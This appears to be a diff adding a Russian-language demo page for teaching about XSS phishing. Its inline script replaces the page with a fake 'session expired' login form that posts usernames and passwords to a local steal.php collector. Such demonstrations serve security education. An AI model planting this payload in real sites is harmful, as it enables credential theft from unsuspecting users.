@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Демонстрация Фишинга</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; }
+        .info { background-color: #fff3cd; border: 1px solid #ffeeba; padding: 15px; margin-bottom: 20px; border-radius: 4px; }
+        #original-content { color: #888; margin-bottom: 20px; font-style: italic; }
+        /* Стили для поддельной формы (чтобы было нагляднее) */
+        form { border: 1px solid #dc3545; padding: 20px; background-color: #f8d7da; border-radius: 5px; margin-top: 15px; }
+        h1 { color: #721c24; }
+        input[type="text"], input[type="password"] { width: 95%; padding: 8px; margin-bottom: 10px; border: 1px solid #f5c6cb; border-radius: 3px; }
+        input[type="submit"] { padding: 10px 15px; background-color: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; }
+        input[type="submit"]:hover { background-color: #c82333; }
+        .payload-info { margin-top:15px; font-size: 0.9em; color: #721c24; }
+    </style>
+</head>
+<body>
+
+    <div class="info">
+        <h2>Демонстрация XSS-атаки (Фишинг)</h2>
+        <p>Эта страница имитирует сайт, на котором сработал XSS-скрипт.</p>
+        <p>Скрипт ниже (как будто внедренный через URL или сохраненный на странице) заменил оригинальное содержимое страницы на поддельную форму входа.</p>
+        <p><strong>Введите любые (не настоящие!) данные в форму и нажмите "Login", чтобы увидеть, как они будут "перехвачены" на следующей странице (<code>steal.php</code>).</strong></p>
+    </div>
+
+    <div id="original-content">
+        (Здесь должно было быть обычное содержимое страницы, но оно будет заменено скриптом...)
+        <hr>
+    </div>
+
+    <!-- Это наш XSS-пейлоад -->
+    <!-- Он заменяет ВЕСЬ `body` на HTML-код поддельной формы -->
+    <!-- Важно: action="steal.php" указывает на наш локальный скрипт-перехватчик -->
+    <script>
+      document.body.innerHTML = '<h1>Please Login Again</h1><p>Your session has expired. Please re-enter your credentials:</p><form action="steal.php" method="post">Username: <input type="text" name="username"><br>Password: <input type="password" name="password"><br><input type="submit" value="Login"></form><p class="payload-info">(Эта форма создана XSS-скриптом! Оригинальное содержимое страницы пропало.)</p>';
+    </script>
+
+    <!-- Этот текст, скорее всего, не отобразится, т.к. скрипт перезапишет body -->
+    <p>Если вы видите это, скрипт не сработал.</p>
+
+</body>
+</html>
